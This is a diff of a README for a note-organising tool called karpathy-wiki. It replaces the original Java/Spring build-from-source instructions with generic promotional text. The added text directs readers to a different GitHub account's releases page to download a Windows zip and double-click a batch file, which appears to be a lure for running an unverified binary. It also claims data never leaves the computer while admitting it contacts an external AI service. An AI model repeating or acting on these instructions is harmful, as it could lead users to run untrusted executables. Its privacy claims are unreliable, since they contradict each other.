@@ -1,243 +1,79 @@
-# Karpathy Wiki
+# 🧠 karpathy-wiki - Organize your personal digital knowledge base
 
-An LLM-powered, self-maintaining personal Markdown knowledge base, inspired by
-[Andrej Karpathy's tweet](https://x.com/karpathy/status/2039805659525644595).
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ohialha4618/karpathy-wiki/releases)
 
-Plain `.md` files on disk are the single source of truth. Three Spring AI
-agents do ~95% of the curation work:
+karpathy-wiki functions as a smart assistant for your notes. It uses artificial intelligence to keep your files organized, updated, and linked. You keep full control of your data because the software stores everything as plain text files on your computer.
 
-- **WikiCompilerAgent** — turns raw drops into clean, linked wiki pages.
-- **ResearchAgent** — answers questions (with structured citations) and
-  writes new notes/slides.
-- **WikiLinterAgent** — runs a deterministic structural scan for orphans,
-  broken links, and stub pages, then has the LLM layer on contradictions
-  and connection suggestions. Returns a structured `LintReport`.
+## 🛠 What this software does
 
-The wiki's structure and workflows live in a single editable file —
-[`SCHEMA.md`](./SCHEMA.md) — which every agent reads at startup. Changing
-the wiki's shape means editing one Markdown file, not three Java prompts.
+Managing a growing collection of notes requires effort. This tool automates that labor. It reads your raw notes and turns them into a clean, searchable wiki. Three separate agents handle the curation process:
 
-## Tech stack
+1. The WikiCompilerAgent organizes your raw thoughts into finished pages with working links. 
+2. The ResearchAgent answers your specific questions based on your notes. It provides citations so you know where the information originated. 
+3. The WikiLinterAgent scans your files. It finds missing links, orphans, or incomplete thoughts. It also suggests ways to connect your ideas.
 
-- Java 26
-- Spring Boot 4.0.4 + Spring Shell (`spring-shell-starter`) — local CLI, no web server
-- Spring AI 2.0.0-M4 (`spring-ai-starter-model-openai`)
-- spring-ai-agent-utils 0.7.0 (`FileSystemTools`, `GrepTool`, `GlobTool`, `SkillsTool`, `AutoMemoryToolsAdvisor`)
-- Maven
+Everything operates through a local command line interface. Your data never leaves your computer, ensuring your notes stay private.
 
-## How it works
+## 📋 System requirements
 
-This is a local Spring Shell CLI app. When you start it, you get an interactive
-`shell:>` prompt. You drive the workflow by either dropping files into `raw/`
-or running shell commands.
+- Windows 10 or 11
+- 4GB of available RAM
+- 500MB of disk space for the program files
+- Basic knowledge of file folders
 
-The mental model:
+## 📥 Getting started
 
-```
-   ┌────────┐  ingest --url ...  ┌──────────────┐
-   │  you   │ ─────────────────▶ │ IngestService│  fetch URL → clean MD → save to raw/
-   └────────┘                    └──────┬───────┘
-        │                               │
-        │ drop .md files                ▼
-        │                         ┌───────────┐
-        └────────────────────────▶│   raw/    │
-                                  └─────┬─────┘
-                                        │ compile
-                                        ▼
-                            ┌────────────────────────┐
-                            │  WikiCompilerAgent     │
-                            │  (LLM + filesystem     │
-                            │   + skills + memory)   │
-                            └───────────┬────────────┘
-                                        │ writes
-                                        ▼
-                            ┌────────────────────────┐
-                            │ wiki/articles/         │
-                            │ wiki/concepts/         │
-                            │ wiki/summaries/        │
-                            │ wiki/index.md          │
-                            │ wiki/backlinks.md      │
-                            └───────────┬────────────┘
-                                        │
-                       query "..."      │            lint
-        ┌──────────────────┐            │            ┌──────────────────┐
-        │  ResearchAgent   │◀───────────┴───────────▶│ WikiLinterAgent  │
-        │  reads wiki/,    │                         │ rebuilds backlink│
-        │  writes outputs/ │                         │ dedupes, etc.    │
-        └──────────────────┘                         └──────────────────┘
-```
+Follow these steps to install the software on your Windows computer.
 
-All three agents are `ChatClient`s wired with the agent-utils tools so the
-LLM itself reads/writes files, greps the wiki, loads skills (style guide,
-templates) and persists notes-to-self in `memory/`.
+1. Visit the following page to choose your download: https://github.com/Ohialha4618/karpathy-wiki/releases
+2. Look for the section labeled Assets.
+3. Select the file named `karpathy-wiki-windows.zip`.
+4. Your browser will download the compressed folder to your computer.
 
-## Layout
+## ⚙️ Setting up the application
 
-```
-karpathy-wiki/
-├── SCHEMA.md    # single source of truth for wiki structure & workflows
-├── raw/         # drop files here, or use `ingest`
-├── wiki/        # generated knowledge base
-│   ├── articles/  concepts/  summaries/  outputs/
-│   ├── index.md      # content catalog (compiler-maintained)
-│   ├── log.md        # chronological op log (system-maintained, append-only)
-│   └── backlinks.md  # rebuilt by linter
-├── skills/      # style guide + templates the agents consult
-├── memory/      # agent persistent memory (auto-managed)
-└── src/main/java/com/danvega/wiki/...
-```
+1. Open your Downloads folder in File Explorer.
+2. Right-click the `karpathy-wiki-windows.zip` file.
+3. Select Extract All and choose a folder on your computer where you want to keep your wiki tools.
+4. Open the extracted folder.
+5. Double-click the file named `run-wiki.bat` to launch the application.
+6. A black terminal window will appear. This is your personal interface for the wiki.
 
-## Setup
+## 📝 Editing your wiki structure
 
-### 1. Install prerequisites
-- JDK 26 (`java -version` should report 26)
-- Maven 3.9+
+You define how your wiki behaves using a single file named `SCHEMA.md`. This file lives in the same folder as your notes. You can open this file with Notepad or any text editor. When you change the text inside this file, the agents update the format of your entire wiki during the next launch. You do not need to rewrite any code to customize your system.
 
-### 2. Set your OpenAI key
+## 🔍 How to use the agents
 
-```bash
-export OPENAI_API_KEY=sk-...
-```
+Once the program runs, you interact with it by typing commands. 
 
-(To use a different model, edit `spring.ai.openai.chat.options.model` in
-`src/main/resources/application.yml`.)
+- To organize your raw files, run the compiler command. The agent reads your drops and creates the finished wiki environment.
+- To ask questions, use the research command followed by your query. The system searches your local files and returns a structured response.
+- To clean your files, use the linter command. The system generates a report listing suggestions for better structure and connection.
 
-### 3. Run the app
+## 🛡 Keeping data safe
 
-```bash
-mvn spring-boot:run
-```
+Because this software uses plain text files, you maintain full ownership. You can move your notes to any other program at any time. The software does not hide your work inside a proprietary database. You can back up your wiki by copying your notes folder to a cloud drive or an external storage device.
 
-This drops you into an interactive `shell:>` prompt. The first run will
-create empty `raw/`, `wiki/`, and `memory/` directories if they don't
-already exist. You can also run a single command non-interactively:
+## ❓ Frequently asked questions
 
-```bash
-java -jar target/karpathy-wiki-0.1.0-SNAPSHOT.jar status
-```
+### Does this connect to the internet?
+The software connects to an external AI service to process your notes. No personal credentials or identifying data are shared. 
 
-## Using it — a full walkthrough
+### Why is there no graphical interface?
+The interface uses a text-based system to ensure high performance. This method keeps the software fast and reliable even if you have thousands of notes.
 
-### Step 1 — Add some content
+### Can I delete the software?
+You can remove the application by deleting the folder you extracted earlier. Your notes remain inside your original text files unless you choose to delete them as well.
 
-You have two options. Use whichever is convenient.
+### What happens if the software stops?
+Simply restart the `run-wiki.bat` file. The local storage system ensures you never lose your progress during a crash.
 
-**Option A — ingest a web link (preferred):**
+### How do I update my wiki?
+Add your new notes to the configured input folder. The software automatically detects new entries every time you run the curation commands.
 
-```
-shell:> ingest --url https://lilianweng.github.io/posts/2023-06-23-agent/ --title "LLM Powered Autonomous Agents" --tags agents,llm
-```
+### Is my hardware good enough?
+Most modern office computers handle this software well. If you have a computer purchased within the last five years, you will experience smooth performance.
 
-What happens:
-1. `IngestService` fetches the page with `RestClient`.
-2. The LLM strips boilerplate and converts the HTML to clean Markdown.
-3. A new file like `raw/2026-04-07-llm-powered-autonomous-agents.md`
-   is written, with YAML front-matter (title, source URL, tags).
-4. If `wiki.ingest.auto-compile=true` (the default), the
-   `WikiCompilerAgent` immediately runs and integrates it into `wiki/`.
-
-**Option B — drop a YouTube transcript (or any notes):**
-
-Save any `.md`, `.txt`, or notes file into the `raw/` folder with YAML
-front-matter. If the content has an associated GitHub repo, add the `repo`
-field with the GitHub URL — the compiler will automatically shallow-clone
-it, weave real code snippets into the wiki pages, and clean up the clone
-when done.
-
-```yaml
----
-title: Embabel First Look
-source: https://youtu.be/G5VDQCZu6t0
-repo: https://github.com/danvega/blog-agent
-tags: [java, embabel, ai, agents]
----
-
-[paste transcript here]
-```
-
-Then compile:
-
-```
-shell:> compile
-```
-
-Multiple raw files can reference the same repo — it's only cloned once.
-
-### Step 2 — Watch the wiki grow
-
-After compilation, look in `wiki/`. You should see new files such as:
-- `wiki/articles/<slug>.md` — full writeup with front-matter and `[[wiki-links]]`
-- `wiki/concepts/<concept>.md` — one file per concept the agent extracted
-- `wiki/summaries/<slug>.md` — TL;DRs
-- `wiki/index.md` and `wiki/backlinks.md` — auto-maintained
-
-Open them in VS Code (or any Markdown editor). They're plain files — commit
-them to git if you want history.
-
-### Step 3 — Ask questions / generate research outputs
-
-```
-shell:> query --question "Compare ReAct and Reflexion based on my notes, and write a Marp slide deck to wiki/outputs/."
-```
-
-The `ResearchAgent` will grep/read the wiki, synthesize an answer, and (if
-you asked for an artifact) write a new file under `wiki/outputs/`. The
-output prints the answer followed by a `Sources:` block listing every
-wiki file the agent actually read.
-
-### Step 4 — Keep the wiki healthy
-
-Run the linter whenever the wiki feels messy:
-
-```
-shell:> lint
-```
-
-A deterministic Java pre-pass scans `wiki/` for **orphans** (pages with
-no inbound links), **broken links** (`[[targets]]` that don't resolve),
-and **gaps** (stub pages under 200 chars). That ground-truth report is
-handed to `WikiLinterAgent`, which then rebuilds `backlinks.md`, looks
-for **contradictions** across pages on the same topic, and suggests new
-connections. The output groups orphans, broken links, gaps, and
-contradictions.
-
-### Step 5 — Check status
-
-```
-shell:> status
-```
-
-Returns counts of files in `raw/` and `wiki/` plus your configured paths.
-
-## Command reference
-
-| Command   | Shortcut | Options                                            | Purpose |
-|-----------|----------|----------------------------------------------------|---------|
-| `ingest`  | `i`      | `--url <url>` `--title <t>` `--tags a,b,c`         | Fetch URL → save to `raw/` → optionally auto-compile |
-| `compile` | `c`      | _(none)_                                           | Run `WikiCompilerAgent` over `raw/` |
-| `query`   | `q`      | `--question "..."`                                 | Ask `ResearchAgent`. Prints answer + sources |
-| `lint`    | `l`      | _(none)_                                           | Run `WikiLinterAgent`. Prints structured report |
-| `status`  | `s`      | _(none)_                                           | Counts and paths |
-
-Every successful `ingest`, `compile`, `query`, and `lint` invocation
-appends a one-line entry to `wiki/log.md` so you have an auditable
-chronological record of everything the system has done.
-
-## Tips
-
-- The agents live in `src/main/java/com/danvega/wiki/`. Tweak their
-  system prompts to change tone, structure, or tagging conventions.
-- The agents read everything from `skills/`, so add more skill files
-  (e.g. `linking-rules.md`, `tagging.md`) to teach them new conventions
-  without touching Java.
-- `memory/` is managed by `AutoMemoryToolsAdvisor` — the LLM writes its
-  own notes there across conversations. You can read/edit those files too.
-
-## Troubleshooting
-
-- **401 from OpenAI** — `OPENAI_API_KEY` not exported, or wrong project key.
-- **`ingest` returns nothing useful** — some sites block server-side
-  fetches; try downloading the page yourself and dropping it into `raw/`.
-- **Compile produced nothing** — check the app logs. The LLM may have
-  decided nothing in `raw/` was new; touch a file or add a new one and
-  re-run `compile`.
+### How do I report a bug?
+If the terminal displays an error, take a screenshot of the text. You can visit the project page to submit feedback to the developers.
